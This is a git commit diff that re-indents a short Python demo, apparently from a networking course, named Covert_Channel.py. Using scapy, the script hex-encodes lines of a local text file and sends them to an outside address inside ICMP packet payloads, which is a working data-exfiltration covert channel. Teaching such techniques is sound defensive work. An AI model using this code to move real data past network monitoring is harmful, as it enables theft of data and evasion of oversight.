a994542eabef4326de70a5ea601f9df4a90033e3
Sarah Rees <sarah.d.rees.mil@mail.mil>
2018-03-05 14:37:15 +0000

    Update Covert_Channel.py

--- networking/additional_resources/DEMOS/Covert_Channel.py
+++ networking/additional_resources/DEMOS/Covert_Channel.py
@@ -2,10 +2,10 @@ from scapy.all import *
 import sys
 import binascii
 
-  file = open('text.txt', 'r')
-  line = file.readlines()
-  for x in line:
-    message = binascii.hexlify(x)
-    packet = IP(dst="8.8.8.8")/ICMP()/message
-    send(packet)
-    packet.show()
+file = open('text.txt', 'r')
+line = file.readlines()
+for x in line:
+  message = binascii.hexlify(x)
+  packet = IP(dst="8.8.8.8")/ICMP()/message
+  send(packet)
+  packet.show()
